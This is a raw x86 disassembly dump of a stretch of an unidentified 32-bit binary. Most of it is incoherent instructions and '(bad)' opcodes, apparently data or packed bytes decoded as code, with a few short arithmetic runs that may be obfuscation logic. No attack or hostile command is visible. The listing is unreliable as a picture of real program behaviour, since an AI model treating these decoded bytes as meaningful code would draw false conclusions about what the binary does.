  40e96a:	or     edx,DWORD PTR ds:0xe6d1cca9
  40e970:	cdq    
  40e971:	pop    ss
  40e972:	inc    ebp
  40e973:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e974:	in     eax,0xb7
  40e976:	call   DWORD PTR [eax+0xc]
  40e979:	sbb    BYTE PTR [ecx+eiz*2-0x46bf3be0],cl
  40e980:	adc    eax,0x24e31f56
  40e985:	jb     0x40e9dd
  40e987:	xchg   esi,eax
  40e988:	add    ebx,DWORD PTR [ebp-0x10]
  40e98b:	dec    edx
  40e98c:	adc    DWORD PTR [edx-0x3a4fd82c],edx
  40e992:	push   esp
  40e993:	aam    0x89
  40e995:	inc    ebx
  40e996:	sub    eax,0xac841b80
  40e99b:	shl    BYTE PTR [ecx],1
  40e99d:	jmp    0x40e94b
  40e99f:	mov    BYTE PTR [edi+0xd],ch
  40e9a2:	mov    edx,0xc61e87eb
  40e9a7:	add    esp,esp
  40e9a9:	imul   ecx,DWORD PTR [ebp+0x640011bb],0x463f108
  40e9b3:	xchg   ecx,eax
  40e9b4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e9b5:	imul   esp,DWORD PTR [esi-0x61],0x25
  40e9b9:	sar    DWORD PTR [ebx+0x4b],0xec
  40e9bd:	adc    BYTE PTR ds:0xe91eb2aa,bl
  40e9c3:	cmp    al,dh
  40e9c5:	mov    ch,0x8c
  40e9c7:	lahf   
  40e9c8:	and    DWORD PTR [eax],ebx
  40e9ca:	push   ss
  40e9cb:	xchg   BYTE PTR [ebp+edx*4-0x47],al
  40e9cf:	rcr    esi,cl
  40e9d1:	test   DWORD PTR [ecx+0x3926d899],eax
  40e9d7:	xor    BYTE PTR [ebx],bl
  40e9d9:	daa    
  40e9da:	addr16 (bad) 
  40e9dc:	or     edx,DWORD PTR [edx-0x24]
  40e9df:	pop    ds
  40e9e0:	add    BYTE PTR [edx-0x4092479f],cl
  40e9e6:	jnp    0x40ea4f
  40e9e8:	push   esi
  40e9e9:	mov    DWORD PTR [esi],edi
  40e9eb:	cs (bad) 
  40e9ee:	sbb    eax,0xb547df8b
  40e9f3:	jne    0x40e978
  40e9f5:	pushf  
  40e9f6:	arpl   WORD PTR [esi-0x3a01aab6],ax
  40e9fc:	in     eax,0x9c
  40e9fe:	lahf   
  40e9ff:	adc    BYTE PTR [eax-0x1],al
  40ea02:	iret   
  40ea03:	pop    DWORD PTR [ebp-0x6b]
  40ea06:	mov    edx,0xfc021afa
  40ea0b:	mov    dh,0x4e
  40ea0d:	sub    ecx,DWORD PTR [ebx-0x31]
  40ea10:	sub    al,0x37
  40ea12:	call   0x95c8:0x5946e55d
  40ea19:	xchg   edx,eax
  40ea1a:	xor    al,0xd6
  40ea1c:	push   ebx
  40ea1d:	ds popf 
  40ea1f:	sub    DWORD PTR [esi-0x2a723231],edi
  40ea25:	xchg   esp,eax
  40ea26:	xchg   ecx,eax
  40ea27:	ins    DWORD PTR es:[edi],dx
  40ea28:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ea29:	cmp    BYTE PTR ss:[esi-0x7d],0x4f
  40ea2e:	inc    ebp
  40ea2f:	in     eax,0xb0
  40ea31:	dec    esi
  40ea32:	sub    dl,BYTE PTR [esi]
  40ea34:	mov    esp,0xa961cebb
  40ea39:	xor    BYTE PTR [ecx-0x2e62aa29],dl
  40ea3f:	neg    BYTE PTR [ebp-0x72]
  40ea42:	push   edx
  40ea43:	mov    ah,bh
  40ea45:	and    eax,0xf271d52b
  40ea4a:	inc    esp
  40ea4b:	fidivr WORD PTR [ebx]
  40ea4d:	imul   edi,DWORD PTR [edx+0x7f],0x392cd5fb
  40ea54:	data16 jae 0x40eabe
  40ea57:	mov    esi,0xd8c2d393
  40ea5c:	ins    DWORD PTR es:[edi],dx
  40ea5d:	sbb    BYTE PTR ds:0xceab190c,dh
  40ea63:	fwait
  40ea64:	and    al,0x62
  40ea66:	loop   0x40eac2
  40ea68:	(bad)  
  40ea69:	sahf   
  40ea6a:	das    
  40ea6b:	and    eax,DWORD PTR [ebp-0x51]
  40ea6e:	sub    al,0x71
  40ea70:	(bad)  
  40ea72:	pop    esi
  40ea73:	dec    ebx
  40ea74:	mov    BYTE PTR [ebx+0x4429625],dl
  40ea7a:	mov    esi,0xe1a5cba1
  40ea7f:	inc    edx
  40ea80:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ea81:	icebp  
  40ea82:	cmp    eax,0xd8908b57
  40ea87:	mov    DWORD PTR ss:[ebp-0x4f07c0cd],ebp
  40ea8e:	cli    
  40ea8f:	jmp    0x9d3cd7d6
  40ea94:	in     al,0xae
  40ea96:	adc    ebp,DWORD PTR [ebx]
  40ea98:	in     al,dx
  40ea99:	inc    ebx
  40ea9a:	push   edx
  40ea9b:	xchg   ebp,eax
  40ea9c:	sub    bh,ch
  40ea9e:	pop    ebx
  40ea9f:	ins    DWORD PTR es:[edi],dx
  40eaa0:	mov    ebx,0xf7d23379
  40eaa5:	test   DWORD PTR [ebx+0x42253815],0xd4928b00
  40eaaf:	add    DWORD PTR [eax],eax
  40eab1:	add    BYTE PTR [ebx],ch
  40eab3:	ror    BYTE PTR [ebx+0x48a1045],1
  40eab9:	push   es
  40eaba:	mov    BYTE PTR [edx+ecx*1-0x1c12],al
  40eac1:	mov    eax,DWORD PTR [ebp-0x1c]
  40eac4:	mov    edx,DWORD PTR [ebp-0x18]
  40eac7:	imul   eax,edx
  40eaca:	mov    edx,DWORD PTR [ebp-0x14]
  40eacd:	imul   eax,eax,0x262b
  40ead3:	or     eax,edx
  40ead5:	mov    edx,DWORD PTR [ebp-0x10]
  40ead8:	or     eax,edx
  40eada:	xor    eax,0x59f6
  40eadf:	jmp    0x40eda3
  40eae4:	sub    BYTE PTR [edi-0x3c],0x71
  40eae8:	pushf  
  40eae9:	sbb    bl,BYTE PTR [edx]
  40eaeb:	pop    edx
  40eaec:	mov    ebp,0xcbaa14b9
  40eaf1:	sbb    eax,0xb8fd6a08
  40eaf6:	sbb    BYTE PTR [eax],bl
  40eaf8:	rcl    BYTE PTR [eax+ebx*1],cl
  40eafb:	sbb    BYTE PTR [edi-0x4ad734b3],dh
  40eb01:	aaa    
  40eb02:	sbb    al,0xcb
  40eb04:	xchg   DWORD PTR [edi],eax
  40eb06:	(bad)  
  40eb07:	pop    ss
  40eb08:	hlt    
  40eb09:	outs   dx,DWORD PTR ds:[esi]
  40eb0a:	mov    ds:0x6b3912ec,eax
  40eb0f:	(bad)  
  40eb11:	lahf   
  40eb12:	inc    esi
  40eb13:	inc    eax
  40eb14:	lds    edx,FWORD PTR [ebp+0x1e]
  40eb17:	nop
  40eb18:	and    eax,DWORD PTR [ecx]
  40eb1a:	stc    
  40eb1b:	test   BYTE PTR [ecx+0x43946696],ah
  40eb21:	xor    DWORD PTR [ecx-0x19],ecx
  40eb24:	push   ecx
  40eb25:	in     eax,0x95
  40eb27:	cdq    
  40eb28:	push   es
  40eb29:	les    ebp,FWORD PTR [edx-0x55]
  40eb2c:	sub    ch,0x62
  40eb2f:	jnp    0x40eb39
  40eb31:	xor    esp,DWORD PTR [ebp+0x60a1a382]
  40eb37:	xchg   edx,eax
  40eb38:	sub    eax,DWORD PTR [eax+0x41]
  40eb3b:	loope  0x40eb3e
  40eb3d:	test   eax,0xf1b50078
  40eb42:	adc    eax,0x266c823e
  40eb47:	shr    DWORD PTR [ebp+0x42045115],0xb1
  40eb4e:	dec    esp
  40eb4f:	xor    DWORD PTR [edx+0x7c],esi
  40eb52:	arpl   WORD PTR [edx-0x71d8efab],cx
  40eb58:	neg    DWORD PTR [ecx+ecx*4]
  40eb5b:	xchg   edi,eax
  40eb5c:	add    BYTE PTR [ecx+edi*4+0x3a],dh
  40eb60:	ins    DWORD PTR es:[edi],dx
  40eb61:	dec    ebx
  40eb62:	aaa    
  40eb63:	sub    bl,BYTE PTR [esi-0x32]
  40eb66:	mov    ch,0xf
  40eb68:	jmp    0x4435:0x50859d14
  40eb6f:	fucom  st(3)
  40eb71:	ins    BYTE PTR es:[edi],dx
  40eb72:	fcmovbe st,st(2)
  40eb74:	cmp    eax,0x42341014
  40eb79:	imul   eax,DWORD PTR [ecx],0xc381fbdf
  40eb7f:	lds    ecx,FWORD PTR [ebx]
  40eb81:	test   BYTE PTR [eax],dh
  40eb83:	cld    
  40eb84:	push   ds
  40eb85:	shr    al,1
  40eb87:	dec    esp
  40eb88:	daa    
  40eb89:	into   
  40eb8a:	stc    
  40eb8b:	fild   QWORD PTR [edx+0x2ff90f36]
  40eb91:	retf   0x330f
  40eb94:	(bad)  
  40eb95:	addr16 inc ebx
  40eb97:	pushf  
  40eb98:	jl     0x40eb2b
  40eb9a:	data16 loope 0x40ebac
  40eb9d:	ret    0x4ac1
  40eba0:	cmp    edi,DWORD PTR [ecx+0x5a63e6d2]
  40eba6:	idiv   DWORD PTR [esp+ebx*1+0x1d]
  40ebaa:	fwait
  40ebab:	call   0xf8ac:0x53445f5a
  40ebb2:	ret    
  40ebb3:	jg     0x40ebdf
  40ebb5:	je     0x40eb61
  40ebb7:	call   FWORD PTR [edi+0x671564ac]
  40ebbd:	cmc    
  40ebbe:	ret    0x53a0
  40ebc1:	and    al,0x2d
  40ebc3:	fistp  WORD PTR [edi-0x15]
  40ebc6:	sbb    DWORD PTR [ebx],esp
  40ebc8:	mov    DWORD PTR [esi+0x33],ebp
  40ebcb:	push   ebx
  40ebcc:	stos   DWORD PTR es:[edi],eax
  40ebcd:	clc    
  40ebce:	sub    ah,ah
  40ebd0:	or     BYTE PTR [eax-0x1c],ch
  40ebd3:	idiv   dh
  40ebd5:	and    al,0x37
  40ebd7:	lea    eax,[edi]
  40ebd9:	dec    ebp
  40ebda:	and    esi,DWORD PTR [esi+0x28]
  40ebdd:	out    0x56,eax
  40ebdf:	hlt    
  40ebe0:	int3   
  40ebe1:	mov    ds:0xcbacc5c8,al
  40ebe6:	aad    0x65
  40ebe8:	out    dx,al
  40ebe9:	(bad)  
  40ebea:	stos   DWORD PTR es:[edi],eax
  40ebeb:	test   eax,0x76a066d3
  40ebf0:	rcr    DWORD PTR [edx-0x57],cl
  40ebf3:	sub    eax,0xaf3d609c
  40ebf8:	dec    edx
  40ebf9:	push   eax
  40ebfa:	sub    al,bl
  40ebfc:	ret    0x7b68
  40ebff:	(bad)  
  40ec01:	(bad)  
  40ec02:	(bad)  
  40ec03:	shr    BYTE PTR [ecx-0x270497b6],0x6
  40ec0a:	inc    ebx
  40ec0b:	aas    
  40ec0c:	sub    BYTE PTR [eax+0x54],al
  40ec0f:	mov    bl,ah
  40ec11:	sbb    DWORD PTR [ebx],ebp
  40ec13:	push   edx
  40ec14:	xchg   esp,eax
  40ec15:	mov    edi,0xd82045a6
  40ec1a:	xchg   edi,eax
  40ec1b:	and    DWORD PTR [edx+0x18],edx
  40ec1e:	das    
  40ec1f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ec20:	push   0x8a830a2c
  40ec25:	cmp    dl,BYTE PTR [ebx+0x65ca8ae]
  40ec2b:	je     0x40ebd7
  40ec2d:	xor    edx,DWORD PTR [eax-0x73]
  40ec30:	int3   
  40ec31:	xchg   BYTE PTR [edx-0x66617433],al
  40ec37:	out    dx,al
  40ec38:	xor    eax,0xae04b312
  40ec3d:	aaa    
  40ec3e:	inc    ax
  40ec40:	adc    DWORD PTR [ebp-0x4c],edx
  40ec43:	sbb    ecx,ecx
  40ec45:	fcomp  DWORD PTR [edx+0x34cb235f]
  40ec4b:	addr16 icebp 
  40ec4d:	push   ss
  40ec4e:	lahf   
  40ec4f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ec50:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ec52:	ins    DWORD PTR es:[edi],dx
  40ec53:	scas   al,BYTE PTR es:[edi]
  40ec54:	test   BYTE PTR [edi+0x8],0xcc
  40ec58:	mov    dl,bh
  40ec5a:	sub    BYTE PTR [ecx-0x56ac9030],0xe4
  40ec61:	mov    edx,ss
  40ec63:	js     0x40ebf2
  40ec65:	into   
  40ec66:	lea    esi,[ebp+0x7cf4cf31]
  40ec6c:	cs aam 0x44
  40ec6f:	lea    ebp,[ebx]
  40ec71:	pop    edx
  40ec72:	iret   
  40ec73:	test   eax,0x1b1173f4
  40ec78:	stc    
  40ec79:	and    eax,0x18e15f4b
  40ec7e:	pop    edi
  40ec7f:	and    dl,BYTE PTR [edi+eax*4-0x2d128806]
  40ec86:	xchg   ebp,eax
  40ec87:	and    eax,0x3bdc562d
  40ec8c:	sbb    al,0xed
  40ec8e:	cld    
  40ec8f:	add    eax,0x131a8db2
  40ec94:	retf   0x4383
  40ec97:	or     DWORD PTR [edx],0x1a
  40ec9a:	ins    DWORD PTR es:[edi],dx
  40ec9b:	addr16 mov ds:0xa089,eax
  40ec9f:	lea    esp,[edi+0x4b64d7c1]
  40eca5:	and    dh,BYTE PTR [edx+0x1e]
  40eca8:	cmp    eax,0xafac32da
  40ecad:	stos   DWORD PTR es:[edi],eax
  40ecae:	out    0x81,al
  40ecb0:	nop
  40ecb1:	xchg   BYTE PTR [esi-0x31],bh
  40ecb4:	push   0x30
  40ecb6:	gs inc ecx
  40ecb8:	das    
  40ecb9:	inc    ebp
  40ecba:	fild   QWORD PTR ds:0xfafacde5
  40ecc0:	adc    BYTE PTR [edi+esi*8+0x5cd6e3d2],0x11
  40ecc8:	rcl    BYTE PTR [ebx],1
  40ecca:	dec    ebx
  40eccb:	in     eax,0x60
  40eccd:	pop    esp
  40ecce:	xchg   ebp,eax
  40eccf:	xor    eax,0x13783cee
  40ecd4:	je     0x40ecbf
  40ecd6:	xchg   edx,eax
  40ecd7:	loop   0x40eca7
  40ecd9:	pop    ebx
  40ecda:	jle    0x40ed00
  40ecdc:	std    
  40ecdd:	jp     0x40ed0c
  40ecdf:	loope  0x40ed21
  40ece1:	push   ecx
  40ece2:	jmp    esi
  40ece4:	xlat   BYTE PTR ds:[ebx]
  40ece6:	add    DWORD PTR [edi+edi*2+0x3fcacee4],eax
  40eced:	xchg   ecx,eax
  40ecee:	jmp    0x72b6:0x960b2b5c
  40ecf5:	mov    dl,0x71
  40ecf7:	in     eax,dx
  40ecf8:	test   eax,0x7d954e7f
  40ecfd:	adc    BYTE PTR [esi-0x11],al
  40ed00:	xor    eax,0x923947bd
  40ed05:	out    dx,al
  40ed06:	cmp    eax,0xcb7606f8
  40ed0b:	mov    edx,0xa21d3352
  40ed10:	push   edi
  40ed11:	out    dx,al
  40ed12:	das    
  40ed13:	mov    edi,0xce6d688b
  40ed18:	pop    ss
  40ed19:	jg     0x40ed33
  40ed1b:	jl     0x40ecef
  40ed1d:	test   DWORD PTR [ebp+0x2],ebx
  40ed20:	pop    ss
  40ed21:	sub    ebp,ebx
  40ed23:	xchg   ebx,eax
  40ed24:	icebp  
  40ed25:	dec    ebp
  40ed26:	pop    edx
  40ed27:	mov    ah,0x3b
  40ed29:	leave  
  40ed2a:	mov    ah,0xf1
  40ed2c:	add    dh,BYTE PTR [eax+0x36]
  40ed2f:	pop    edx
  40ed30:	leave  
  40ed31:	fst    st(1)
  40ed33:	push   ecx
  40ed34:	mov    eax,0x79da3a7d
  40ed39:	push   ecx
  40ed3a:	loope  0x40ed5a
  40ed3c:	lods   eax,DWORD PTR ds:[esi]
  40ed3d:	popa   
  40ed3e:	bound  esp,QWORD PTR [eax-0x1b2406a1]
  40ed44:	addr16 mov dh,0x16
  40ed47:	adc    BYTE PTR [edx-0x46269f9e],cl
  40ed4d:	mov    esp,0xa4903485
  40ed52:	inc    edx
  40ed53:	push   ss
  40ed54:	mov    bh,0xa7
  40ed56:	sub    DWORD PTR [ebx+0x12e9c067],edi
  40ed5c:	aas    
  40ed5d:	daa    
  40ed5e:	dec    eax
  40ed5f:	leave  
  40ed60:	pop    edi
  40ed61:	pusha  
  40ed62:	cwde   
  40ed63:	fiadd  WORD PTR [ecx-0x66]
  40ed66:	xchg   ecx,eax
  40ed67:	xchg   DWORD PTR [ecx+edi*1],esp
  40ed6a:	xor    eax,0xe94435d8
  40ed6f:	fs mov ebx,0x9f749c76
  40ed75:	mov    ebp,0xe7b7a69
  40ed7a:	fcom   DWORD PTR [ecx+0x75]
  40ed7d:	ror    DWORD PTR [esi-0x12],cl
  40ed80:	ins    BYTE PTR es:[edi],dx
  40ed81:	and    DWORD PTR [ebp+0x5c],ebp
  40ed84:	jbe    0x40ed4e
  40ed86:	jne    0x40ed2b
  40ed88:	outs   dx,DWORD PTR ds:[esi]
  40ed89:	sbb    eax,0x2d8635b2
  40ed8e:	inc    esi
  40ed8f:	pop    eax
  40ed90:	mov    ds:0x31313f8,al
  40ed95:	iret   
  40ed96:	jae    0x40edd1
  40ed98:	xchg   esp,eax
  40ed99:	shl    DWORD PTR [ecx-0x51],1
  40ed9c:	jl     0x40ed26
  40ed9e:	mov    dh,0x1f
  40eda0:	mov    ah,0xc1
  40eda2:	mov    ch,0x8d
  40eda4:	mov    WORD PTR [ecx],es
  40eda6:	out    0x59,al
  40eda8:	add    eax,0xf4458b35
  40edad:	and    eax,0xddc
  40edb2:	add    eax,DWORD PTR [ebp-0x8]
  40edb5:	xor    eax,0x46e3
  40edba:	add    eax,0x50eb
  40edbf:	cmp    ecx,eax
  40edc1:	jmp    0x40f085
  40edc6:	cmp    DWORD PTR [edx-0x25e5f4a4],ecx
  40edcc:	daa    
  40edcd:	sub    ch,BYTE PTR [edx-0x3f55ed90]
  40edd3:	enter  0xaa14,0xb7
  40edd7:	mov    dl,0x18
  40edd9:	sbb    dl,dl
  40eddb:	adc    al,0x18
  40eddd:	sbb    cl,ah
  40eddf:	mov    eax,ds:0x13502900
  40ede4:	sbb    cl,BYTE PTR [ebx]
  40ede6:	les    edi,FWORD PTR [ecx]
  40ede8:	imul   edx,DWORD PTR [ecx],0x13
  40edeb:	mov    BYTE PTR [edi],0xae
  40edee:	and    esi,eax
  40edf0:	or     cl,BYTE PTR [ecx+0x40576894]
  40edf6:	xor    eax,0x7113585
  40edfb:	lods   al,BYTE PTR ds:[esi]
  40edfc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40edfd:	pop    es
  40edfe:	adc    dl,BYTE PTR [ebp+0x482ec5b7]
  40ee04:	inc    ecx
  40ee05:	xchg   esi,eax
  40ee06:	fild   DWORD PTR [ecx+0x15]
  40ee09:	pop    ecx
  40ee0a:	push   0xffffff89
  40ee0c:	cmp    al,0x0
  40ee0e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ee0f:	xor    al,cl
  40ee11:	dec    ecx
  40ee12:	fbld   TBYTE PTR [eax+0x5f]
  40ee15:	mov    dh,0x1
  40ee17:	and    BYTE PTR [ecx],bh
  40ee19:	ror    DWORD PTR [esi-0x71],1
  40ee1c:	adc    BYTE PTR [esi],bh
  40ee1e:	xchg   edx,eax
  40ee1f:	xor    eax,0xf9b431ad
  40ee24:	(bad)  [ebx]
  40ee26:	pop    ebx
  40ee27:	or     al,0x55
  40ee29:	enter  0xb740,0xc6
  40ee2d:	jl     0x40ee64
  40ee2f:	imul   edi,eax,0x89984dc5
  40ee35:	mov    dl,0x34
  40ee37:	xor    BYTE PTR [ebx],cl
  40ee39:	push   cs
  40ee3a:	pop    edx
  40ee3b:	(bad)  
  40ee3c:	push   esi
  40ee3d:	push   edx
  40ee3e:	setno  BYTE PTR [ecx-0x360fc582]
  40ee45:	aad    0x2f
  40ee47:	fimul  WORD PTR [bx+0x1402]
  40ee4c:	dec    ecx
  40ee4d:	jns    0x40eeab
  40ee4f:	dec    ebx
  40ee50:	fs xchg bh,cl
  40ee53:	not    dl
  40ee55:	pop    esi
  40ee56:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ee57:	jb     0x40ee0a
  40ee59:	call   0x1a5f:0xaa83b0dd
  40ee60:	(bad)
  40ee64:	ret    0xabb
  40ee67:	xchg   esi,eax
  40ee68:	inc    esp
  40ee69:	adc    DWORD PTR gs:[ebp+0x6e],esp
  40ee6d:	cld    
  40ee6e:	(bad)  
  40ee70:	aad    0x9e
  40ee72:	ret    
  40ee73:	xchg   edi,eax
  40ee74:	in     eax,0xfd
  40ee76:	popf   
  40ee77:	mov    edx,0xa0ab228f
  40ee7c:	mov    ds:0x700d4efa,eax
  40ee81:	lock jle 0x40ee08
  40ee84:	test   ebx,esi
  40ee86:	inc    esi
  40ee87:	push   cs
  40ee88:	stos   DWORD PTR es:[edi],eax
  40ee89:	cld    
  40ee8a:	jmp    0xd7e40071
  40ee8f:	push   edx
  40ee90:	jge    0x40ee9f
  40ee92:	pop    edx
  40ee93:	cmc    
  40ee94:	push   esi
  40ee95:	jecxz  0x40ee9f
  40ee97:	cli    
  40ee98:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ee99:	in     al,0xe6
  40ee9b:	jo     0x40eecc
  40ee9d:	cmp    ebp,DWORD PTR [ecx+0x42]
  40eea0:	in     al,0x7f
  40eea2:	push   0x84a7bcb5
  40eea7:	and    eax,0xf47129b0
  40eeac:	mov    esi,0x8cdff5bf
  40eeb1:	xchg   esi,eax
  40eeb2:	shl    DWORD PTR [bp+si+0x2cb2],1
  40eeb7:	fidivr WORD PTR [edx+0x404c3549]
  40eebd:	xchg   ecx,eax
  40eebe:	lea    ebx,[ebx]
  40eec0:	pushf  
  40eec1:	rcl    BYTE PTR [edi],cl
  40eec3:	fcmovnbe st,st(5)
  40eec5:	xlat   BYTE PTR ds:[ebx]
  40eec6:	adc    DWORD PTR [edx+edi*8-0x46a29f62],0x21
  40eece:	mov    ebp,DWORD PTR [eax-0x76]
  40eed1:	dec    esp
  40eed2:	hlt    
  40eed3:	xchg   esp,eax
  40eed4:	test   BYTE PTR ds:[ecx+edx*1+0x38],cl
  40eed9:	mov    ebx,DWORD PTR [ebx]
  40eedb:	loopne 0x40eea2
  40eedd:	rep lods eax,DWORD PTR ds:[esi]
  40eedf:	or     bh,cl
  40eee1:	add    DWORD PTR [ebp-0x4d],ebx
  40eee4:	dec    edx
  40eee5:	nop    esi
  40eee8:	sar    BYTE PTR [ebx+0x33a07ca1],cl
  40eeee:	pushf  
  40eeef:	add    BYTE PTR [edi+0x51],cl
  40eef2:	and    eax,0xcaba18f3
  40eef7:	fidiv  WORD PTR [esi-0x399bf1fb]
  40eefd:	mov    cl,0xca
  40eeff:	xor    ebx,DWORD PTR [ebp+0x20f5157a]
  40ef05:	loope  0x40ef47
  40ef07:	lods   al,BYTE PTR ds:[esi]
  40ef08:	sbb    ecx,esi
  40ef0a:	jnp    0x40eec2
  40ef0c:	jmp    0xc7bb:0x2b2ae497
  40ef13:	cmc    
  40ef14:	(bad)  
  40ef15:	fisttp WORD PTR [edx]
  40ef17:	mov    bl,0x3b
  40ef19:	cli    
  40ef1a:	fs inc eax
  40ef1c:	and    DWORD PTR [ecx-0x302d0330],ebx
  40ef22:	dec    esi
  40ef23:	push   0x51
  40ef25:	inc    ebx
  40ef26:	push   0x1
  40ef28:	shufps xmm0,XMMWORD PTR [edi-0x56],0x48
  40ef2d:	in     al,dx
  40ef2e:	iret   
  40ef2f:	push   esp
  40ef30:	js     0x40efa5
  40ef32:	inc    esp
  40ef33:	jne    0x40eeff
  40ef35:	lds    ecx,FWORD PTR [ecx+edi*4-0x43]
  40ef39:	ds pop edi
  40ef3b:	xlat   BYTE PTR ds:[ebx]
  40ef3c:	fdiv   QWORD PTR [ebp+ebp*2-0x4e8ed50b]
  40ef43:	imul   edi,eax,0xffffff97
  40ef46:	sbb    eax,0x11d9abd0
  40ef4b:	xor    eax,0xdb77d855
  40ef50:	xchg   BYTE PTR [edi],bh
  40ef52:	jp     0x40ef89
  40ef54:	mov    al,0xad
  40ef56:	(bad)  
  40ef57:	call   0x45b3:0x5429426f
  40ef5e:	daa    
  40ef5f:	jg     0x40ef8c
  40ef61:	sti    
  40ef62:	adc    ah,BYTE PTR [eax+0x1438d247]
  40ef68:	sbb    BYTE PTR [edx],bl
  40ef6a:	push   esi
  40ef6b:	fdivr  DWORD PTR [edx-0x47aed52]
  40ef71:	popf   
  40ef72:	sub    DWORD PTR [edx],edx
  40ef74:	fisubr WORD PTR [esi-0xa52f200]
  40ef7a:	jns    0x40ef81
  40ef7c:	retf   0x189c
  40ef7f:	dec    esi
  40ef80:	push   ds
  40ef81:	xor    dh,BYTE PTR [esp-0x80]
  40ef85:	adc    DWORD PTR ds:0xd217455b,edi
  40ef8b:	pop    esi
  40ef8c:	pop    ss
  40ef8d:	mov    dl,BYTE PTR [edi-0x64071e3a]
  40ef93:	mov    ds:0x58bf469,eax
  40ef98:	or     BYTE PTR [esp+esi*8-0x80],0x3e
  40ef9d:	(bad)  
  40ef9f:	ds clc 
  40efa1:	loop   0x40ef5c
  40efa3:	push   edx
  40efa4:	push   ebp
  40efa5:	jb     0x40ef52
  40efa7:	loop   0x40ef9f
  40efa9:	cmp    edx,DWORD PTR [eax]
  40efab:	inc    esp
  40efac:	retf   0x3356
  40efaf:	sub    BYTE PTR [eax-0x4946a56f],cl
  40efb5:	and    DWORD PTR [eax-0x52be5757],0xbf86e895
  40efbf:	dec    eax
  40efc0:	rol    BYTE PTR [ebx+0x71dea80e],0xd8
  40efc7:	ss inc edi
  40efc9:	leave  
  40efca:	lea    ebx,ds:0xddbe2aa9
  40efd0:	push   0x70
  40efd2:	test   ch,0xeb
  40efd5:	xchg   edx,eax
  40efd6:	pop    ds
  40efd7:	jle    0x40f016
  40efd9:	xchg   edi,eax
  40efda:	inc    ebx
  40efdb:	jecxz  0x40f059
  40efdd:	jno    0x40effc
  40efdf:	scas   eax,DWORD PTR es:[edi]
  40efe0:	adc    eax,0xe9779b31
  40efe5:	adc    BYTE PTR [edx+0x28],0x1f
  40efe9:	xor    DWORD PTR [edx+0x7603cd11],edi
  40efef:	inc    ebx
  40eff0:	pop    ebx
  40eff1:	jae    0x40ef80
  40eff3:	mov    ecx,0x7ddc6d12
  40eff8:	sub    al,0xf3
  40effa:	pop    esi
  40effb:	call   0xad2dc2fe
  40f000:	(bad)  
  40f001:	(bad)  
  40f002:	neg    BYTE PTR [ebx]
  40f004:	mov    al,0xfc
  40f006:	sbb    BYTE PTR [edx],0x64
  40f009:	mul    BYTE PTR [edx-0x44363e8d]
  40f00f:	pop    eax
  40f010:	iret   
  40f011:	and    al,0x30
  40f013:	pushf  
  40f014:	sub    esp,DWORD PTR [ebx-0xa]
  40f017:	mov    ebx,0xfa51e352
  40f01c:	dec    edi
  40f01d:	dec    eax
  40f01e:	retf   0x9b58
  40f021:	popf   
  40f022:	in     eax,0x84
  40f024:	jmp    0x40f02a
  40f026:	nop
  40f027:	and    BYTE PTR [eax],ch
  40f029:	lds    edx,FWORD PTR [ecx]
  40f02b:	sub    al,0x42
  40f02d:	call   0xd0c9020c
  40f032:	push   es
  40f033:	sub    eax,esi
  40f035:	jne    0x40f01b
  40f037:	fs xchg esi,eax
  40f039:	(bad)  [esi-0x5a]
  40f03c:	gs dec edi
  40f03e:	pop    edx
  40f03f:	std    
  40f040:	sub    al,0xd5
  40f042:	mov    bh,0x76
  40f044:	or     edx,0x5d
  40f047:	outs   dx,DWORD PTR ds:[esi]
  40f048:	int3   
  40f049:	jb     0x40f071
  40f04b:	fadd   DWORD PTR [edi+ebp*8-0x35108d3e]
  40f052:	jmp    0x397c:0x37d7718c
  40f059:	sub    eax,0x3507ece6
  40f05e:	cmc    
  40f05f:	ins    BYTE PTR es:[edi],dx
  40f060:	xor    eax,0x6a83fe5
  40f065:	or     BYTE PTR [esi],dl
  40f067:	aas    
  40f068:	pop    edx
  40f069:	gs pushf 
  40f06b:	add    BYTE PTR [eax-0x76f51bf8],0x75
  40f072:	retf   0xc425
  40f075:	je     0x40f0ad
  40f077:	dec    edx
  40f078:	lds    ebx,FWORD PTR [edi+0x355d3372]
  40f07e:	jno    0x40f00a
  40f080:	test   eax,0x177ef8b2
  40f085:	jne    0x40e793
  40f08b:	pop    edi
  40f08c:	jmp    0x40f350
  40f091:	inc    edi
  40f092:	mov    ds:0x305a70db,al
  40f097:	inc    edx
  40f098:	call   0x62af:0xaa146552
  40f09f:	mov    DWORD PTR [eax+esi*2-0x52],edi
  40f0a3:	sbb    BYTE PTR [eax],bl
  40f0a5:	rcl    BYTE PTR [eax+ebx*1],cl
  40f0a8:	sbb    BYTE PTR [edi],ah
  40f0aa:	xor    al,0xcf
  40f0ac:	fdivp  st(2),st
  40f0ae:	jo     0x40f0f7
  40f0b0:	inc    esi
  40f0b1:	stc    
  40f0b2:	push   es
  40f0b3:	lods   eax,DWORD PTR ds:[esi]
  40f0b4:	xor    al,0x41
  40f0b6:	jecxz  0x40f12c
  40f0b8:	out    0x3f,eax
  40f0ba:	aam    0xf1
  40f0bc:	mov    esp,0x72a5003c
  40f0c1:	sti    
  40f0c2:	xchg   edi,eax
  40f0c3:	push   edi
  40f0c4:	sub    al,0xd1
  40f0c6:	or     bh,al
  40f0c8:	xchg   edi,eax
  40f0c9:	mov    DWORD PTR [ebx],ebp
  40f0cb:	xchg   esi,eax
  40f0cc:	and    ebp,DWORD PTR [ebp+0x33]
  40f0cf:	push   edx
  40f0d0:	dec    edi
  40f0d1:	xchg   edi,ebp
  40f0d3:	sbb    BYTE PTR [edx+ecx*8-0x4f],ch
  40f0d7:	scas   al,BYTE PTR es:[edi]
  40f0d8:	mov    ch,0x1c
  40f0db:	mov    DWORD PTR [esi+0x27],edx
  40f0de:	and    al,ch
  40f0e0:	inc    esp
  40f0e1:	jb     0x40f0f1
  40f0e3:	mov    esi,0xdf8d554d
  40f0e8:	add    DWORD PTR [esi-0x1f],esi
  40f0eb:	dec    ecx
